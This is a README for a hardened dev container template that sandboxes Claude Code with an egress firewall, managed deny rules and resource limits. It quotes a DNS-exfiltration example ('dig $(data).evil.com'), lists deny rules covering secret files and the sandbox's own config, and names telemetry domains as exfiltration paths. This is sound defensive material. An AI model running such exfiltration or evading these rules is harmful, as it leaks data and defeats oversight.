# Dev Containers + Claude Code: Best Practices Template

A hardened, production-ready dev container template that gives your team:

- **Consistent environments** -- one source of truth committed in Git
- **Claude Code best practices** -- pre-configured, version-pinned, org-policy enforced
- **Security isolation** -- non-root user, filesystem sandboxing, network egress firewall
- **Instant adoption** -- `git clone` + "Reopen in Container" = done

> This template incorporates security patterns from the community's leading projects. See [References](#references--prior-art) for attribution.

## Quick start

1. Copy `.devcontainer/` and `.claude/` into your project repository
2. Adjust the `Dockerfile` base image for your stack (Node, Python, etc.)
3. Edit `managed-settings.json` for your organization's policy
4. Customize `init-firewall.sh` with your internal domains
5. Open in VS Code/Cursor and click **"Reopen in Container"**

## What's included

```
.devcontainer/
  devcontainer.json       # Container config: mounts, env vars, security settings
  Dockerfile              # Hardened image with Bun + Claude Code + non-root user
  managed-settings.json   # Org policy (highest precedence, overrides user settings)
  init-firewall.sh        # Default-deny egress firewall with domain allowlist
  chown-volumes.sh        # Fix Docker volume ownership for non-root user

.claude/
  settings.json           # Project-level Claude Code permissions (deny .devcontainer access)
  commands/
    security-audit.md     # /security-audit — scan for hardcoded secrets, vulns
    review.md             # /review — review staged changes for bugs and security
```

## Architecture

```
+-----------------------+          +----------------------------------+
|   Host Machine        |          |   Dev Container                  |
|                       |          |                                  |
|   VS Code / Cursor  --+-- SSH --+-> Terminal, Claude Code, Tools   |
|                       |          |                                  |
|   ~/Projects/myapp  --+- bind --+-> /workspace (only writable dir) |
|                       |          |                                  |
|   .devcontainer/     -+- r/o  --+-> /workspace/.devcontainer (ro)  |
|                       |          |                                  |
|   ~/.ssh (NOT mounted)|          |   Non-root user: "developer"    |
|   ~/.aws (NOT mounted)|          |   Egress firewall: default-deny |
|                       |          |   Managed settings: enforced    |
|   docker.sock (NEVER) |          |   no-new-privileges, pids limit |
+-----------------------+          +----------------------------------+
```

## Security layers

This template implements defence in depth with multiple security layers, drawing on patterns proven by the community and hardened after a formal security audit:

| Layer | What it does | Source |
|-------|-------------|--------|
| **Non-root user** | Claude Code runs as `developer`, not `root`. Rejects `--dangerously-skip-permissions` as root. | [Anthropic official](https://github.com/anthropics/claude-code/tree/main/.devcontainer) |
| **Filesystem sandboxing** | Only `/workspace` is bind-mounted. Claude cannot modify host system files. | Anthropic official |
| **Read-only .devcontainer** | `.devcontainer/` is mounted read-only inside the container, preventing Claude from modifying its own sandbox config. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
| **Deny rules (managed settings)** | Managed settings deny Claude from reading/editing `.devcontainer/**`, `.env*`, `*.pem`, `*credentials*`, `.claude/settings.json`, `.git/hooks/**`, `.github/workflows/**`. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer), security audit |
| **Bypass mode disabled** | `disableBypassPermissionsMode: "disable"` prevents `--dangerously-skip-permissions` from nullifying all deny rules. | Security audit |
| **Cap-drop ALL + selective add** | All Linux capabilities dropped, only `NET_ADMIN` and `NET_RAW` added back (for firewall). `no-new-privileges` prevents privilege escalation. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
| **Resource limits** | `pids-limit=256`, `memory=8g`, `ulimit nofile=1024:4096`, `ulimit core=0` (no core dumps). | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), security audit |
| **DNS tunneling mitigation** | DNS restricted to Docker's embedded resolver at `127.0.0.11` only. Prevents exfiltration via `dig $(data).evil.com`. | Security audit |
| **Cloud metadata blocking** | Explicit REJECT rules for `169.254.169.254` and `169.254.169.253` (AWS/Azure/GCP metadata). | Security audit |
| **Host network restricted** | Only the Docker gateway IP is allowed, not the entire `/24` subnet. Prevents port-scanning host services. | Security audit |
| **ICMP blocking** | ICMP packets rejected to prevent ICMP tunneling via `NET_RAW` capability. | Security audit |
| **IPv6 disabled** | IPv6 disabled via sysctl + `ip6tables DROP`. Prevents bypassing IPv4 firewall rules entirely. | Security audit |
| **Firewall idempotency** | Lock file prevents re-running firewall script, eliminating the flush-and-rebuild race window. | Security audit |
| **Network egress firewall** | Default-deny iptables. Only `api.anthropic.com`, GitHub, and configured domains reachable. | [Anthropic official](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) |
| **Bun supply chain hardening** | Bun ignores lifecycle scripts by default (unlike npm). No postinstall code execution unless explicitly trusted. | [Bun docs](https://bun.sh/docs/cli/install#lifecycle-scripts) |
| **Scoped sudoers** | Only firewall and volume-ownership scripts can run as root. No broad `NOPASSWD:ALL`. | Production pattern |
| **Managed settings** | `/etc/claude-code/managed-settings.json` enforces org policy at highest precedence. | [Anthropic docs](https://code.claude.com/docs/en/devcontainer#enforce-organization-policy) |
| **No host secrets** | `~/.ssh`, `~/.aws`, `docker.sock` are never mounted. Use SSH agent forwarding or scoped tokens. | All community repos |

### Why no SYS_ADMIN?

Trail of Bits' `check_no_sys_admin()` explicitly blocks the `SYS_ADMIN` capability because it allows `mount()` inside the container, defeating the read-only `.devcontainer` mount. This template follows the same principle by using `--cap-drop=ALL`.

### Known limitations

These are inherent to the iptables-based firewall architecture. For stronger guarantees, consider a proxy-based approach (see [FoamoftheSea's Squid setup](https://github.com/FoamoftheSea/claude-code-sandbox)).

| Limitation | Risk | Mitigation |
|-----------|------|------------|
| **DNS rebinding / stale IPs** | Domains are resolved to IPs at startup and never refreshed. CDN IPs rotate, and GitHub CIDRs are broad. | Use a DNS-aware proxy (Squid + SNI filtering) for production. |
| **GitHub CIDR aggregation** | The `aggregate` tool merges CIDRs into broader supernets, potentially allowing non-GitHub IPs within those ranges. | Remove `aggregate` and use raw CIDRs if your ipset supports the entry count. |
| **Persistent volume poisoning** | `node_modules` and `.bun` volumes persist across sessions. A compromised session could plant malicious code. | Make these volumes ephemeral, or verify `bun.lockb` integrity at startup. |
| **Base image not pinned by digest** | `debian:bookworm-slim` tag is mutable. | Pin by digest for production: `FROM debian:bookworm-slim@sha256:<digest>`. |
| **Build-time remote scripts** | `bun.sh/install` and `zsh-in-docker` are piped from the network without checksum verification. | Vendor scripts into the repo, or use multi-stage builds with verification. |
| **No disk quota** | Docker volumes have no size limits. Claude can fill disk by writing to persistent volumes. | Use `--storage-opt size=10G` (requires overlay2 + xfs) or tmpfs with size limits. |
| **No seccomp/AppArmor profile** | Default Docker seccomp profile applies, but a tighter custom profile could further reduce syscall attack surface. | Add `--security-opt=seccomp=<profile>.json` for high-security deployments. |
| **Telemetry domains as exfil vectors** | `sentry.io` accepts arbitrary JSON payloads and could be used for data exfiltration. | Set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` and remove telemetry domains from the firewall. |

## Customization guide

### Change the base image

Edit the `FROM` line in `Dockerfile`:

```dockerfile
# Python project
FROM python:3.12-slim

# Go project
FROM golang:1.22

# General purpose
FROM mcr.microsoft.com/devcontainers/base:ubuntu

# Maximum reproducibility (trailofbits pattern — pin by digest)
FROM mcr.microsoft.com/devcontainers/base:ubuntu24.04@sha256:<digest>
```

### Add internal domains to the firewall

Edit the `ALLOWED_DOMAINS` array in `init-firewall.sh`:

```bash
ALLOWED_DOMAINS=(
    "api.anthropic.com"
    "registry.npmjs.org"
    # Add your domains:
    "artifactory.yourcompany.com"
    "internal-api.yourcompany.com"
)
```

### Pin Claude Code version

Set `CLAUDE_CODE_VERSION` in `devcontainer.json`:

```json
"args": {
    "CLAUDE_CODE_VERSION": "1.0.0"
}
```

And keep `DISABLE_AUTOUPDATER=1` in `containerEnv`.

### Enforce stricter policies

Edit `managed-settings.json` to lock down behaviors:

```json
{
    "permissions": {
        "disableBypassPermissionsMode": "disable",
        "defaultMode": "default",
        "deny": [
            "Read(.env*)",
            "Read(*.pem)",
            "Read(.devcontainer/**)",
            "Edit(.devcontainer/**)"
        ]
    }
}
```

### Add team slash commands

Add markdown files to `.claude/commands/` (pattern from [awattar/claude-code-best-practices](https://github.com/awattar/claude-code-best-practices)):

```
.claude/commands/
  security-audit.md     # /security-audit
  review.md             # /review
  deploy-checklist.md   # /deploy-checklist
  your-workflow.md      # /your-workflow
```

### Skip the firewall

If you use external network controls, remove from `devcontainer.json`:
- The `NET_ADMIN` and `NET_RAW` entries in `runArgs`
- `postStartCommand`
- `waitFor`

And remove `init-firewall.sh` and firewall packages from the `Dockerfile`.

### Alternative: proxy-based egress filtering

Instead of iptables, [FoamoftheSea/claude-code-sandbox](https://github.com/FoamoftheSea/claude-code-sandbox) uses a Squid proxy with SNI-based domain filtering and a dual-network Docker Compose setup (`internal: true` network). This is arguably more secure since it works at the application layer without requiring `NET_ADMIN`. See their repo for the approach.

## Using the Dev Container Feature instead

For a simpler setup without the Dockerfile, use the official Claude Code Dev Container Feature:

```json
{
    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
    "features": {
        "ghcr.io/anthropics/devcontainer-features/claude-code:1.0": {}
    }
}
```

This installs Claude Code automatically but does not include the firewall, managed settings, or other hardening from this template.

For a composable, language-aware approach, see [smithclay/claudetainer](https://github.com/smithclay/claudetainer) which provides a devcontainer Feature with language-specific presets.

## Comparison with other approaches

| Feature | This template | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox) | [centminmod](https://github.com/centminmod/claude-code-devcontainers) | [Anthropic official](https://github.com/anthropics/claude-code/tree/main/.devcontainer) |
|---------|:---:|:---:|:---:|:---:|:---:|
| Non-root user | Yes | Yes | Yes | Yes | Yes |
| Egress firewall (iptables) | Yes | -- | -- | Yes | Yes |
| Proxy-based egress (Squid) | -- | -- | Yes | -- | -- |
| Read-only .devcontainer mount | Yes | Yes | -- | -- | -- |
| Deny Read(.devcontainer/**) | Yes | Yes | -- | -- | -- |
| Cap-drop ALL | Yes | -- | Yes | Yes | -- |
| no-new-privileges | Yes | -- | Yes | -- | -- |
| Resource limits (pids, memory) | Yes | -- | Yes | -- | -- |
| Supply chain hardening (bun/npm) | Yes | Yes | -- | -- | -- |
| Scoped sudoers (least-privilege) | Yes | -- | -- | -- | -- |
| DNS TCP fallback fix | Yes | -- | -- | -- | -- |
| Volume ownership fix script | Yes | -- | -- | -- | -- |
| Managed settings | Yes | -- | -- | -- | -- |
| Bubblewrap (bwrap) | Yes | Yes | -- | -- | -- |
| SYS_ADMIN check/block | Yes | Yes | -- | -- | -- |
| Team slash commands | Yes | -- | -- | -- | -- |
| Presentation slides | Yes | -- | -- | -- | -- |
| Multi-AI support | -- | -- | -- | Yes | -- |
| `devc` management CLI | -- | Yes | -- | -- | -- |
| Docker Compose architecture | -- | -- | Yes | -- | -- |
| OpenTelemetry monitoring | -- | -- | -- | Yes | -- |

## References & prior art

This template stands on the shoulders of the community. Security patterns, configurations, and ideas were drawn from these projects:

### Official

- **[anthropics/claude-code](https://github.com/anthropics/claude-code/tree/main/.devcontainer)** — Anthropic's reference dev container with egress firewall and volume mounts. The foundation everyone builds from.
- **[Claude Code Dev Container docs](https://code.claude.com/docs/en/devcontainer)** — Official documentation covering setup, policy enforcement, and network restrictions.
- **[anthropics/devcontainer-features](https://github.com/anthropics/devcontainer-features)** — Official Dev Container Feature for one-line Claude Code installation.

### Community — Security focused

- **[trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)** (836 stars) — Security audit-grade sandbox. Pioneered read-only `.devcontainer` mount, SYS_ADMIN capability blocking, NPM supply chain hardening, and `devc` CLI for container management. The gold standard for secure Claude Code dev containers.
- **[FoamoftheSea/claude-code-sandbox](https://github.com/FoamoftheSea/claude-code-sandbox)** — Unique Squid proxy approach with dual-network Docker Compose architecture (`internal: true` for physical network isolation). Granular resource limits (`pids_limit`, `mem_limit`, `cpus`), detailed allow/deny permission lists, and `lock-settings.sh` to prevent self-modification.
- **[neko-kai/claude-code-sandbox](https://github.com/neko-kai/claude-code-sandbox)** (57 stars) — macOS-native approach using `sandbox-exec` (Apple Seatbelt) instead of Docker. Restricts filesystem read access without containerization — useful for environments where Docker isn't available.

### Community — Best practices & tooling

- **[centminmod/claude-code-devcontainers](https://github.com/centminmod/claude-code-devcontainers)** (29 stars) — Most feature-rich multi-AI dev container (Claude, Codex, Gemini). Comprehensive firewall script with extensive domain allowlists, OpenTelemetry integration, git hook system, and memory bank CLAUDE.md pattern.
- **[awattar/claude-code-best-practices](https://github.com/awattar/claude-code-best-practices)** (179 stars) — Documentation repo with reusable `.claude/commands/` (commit, review, issue workflows) and `.claude/agents/` with 10 specialized agent profiles. Pattern for team slash commands.
- **[smithclay/claudetainer](https://github.com/smithclay/claudetainer)** (106 stars) — Claude Code as a composable Dev Container Feature with language-specific presets. Useful for organizations that want a reusable, installable feature rather than copying template files.
- **[textcortex/claude-code-sandbox](https://github.com/textcortex/claude-code-sandbox)** (318 stars, archived) — TypeScript CLI tool with git commit monitoring, credential auto-discovery, and shadow repository sync. Interesting patterns for automated session management.
- **[griffinhilly/claude-code-synthesis](https://github.com/griffinhilly/claude-code-synthesis)** (66 stars) — Curated synthesis of Claude Code best practices aggregated from the community.

## Presentation

This repo includes an interactive slide deck for presenting dev container + Claude Code best practices to your team.

**Live:** [https://decebal.github.io/devcontainers-best-practices/](https://decebal.github.io/devcontainers-best-practices/)

Run locally:

```bash
cargo run
# Serves at http://localhost:8080
```

## Resources

- [Claude Code Dev Containers docs](https://code.claude.com/docs/en/devcontainer)
- [Dev Containers specification](https://containers.dev/)
- [Claude Code admin setup](https://code.claude.com/docs/en/admin-setup)
- [Network access requirements](https://code.claude.com/docs/en/network-config#network-access-requirements)
- [Managed settings reference](https://code.claude.com/docs/en/settings#settings-files)
- [Permission modes](https://code.claude.com/docs/en/permission-modes)
- [Security model](https://code.claude.com/docs/en/security)
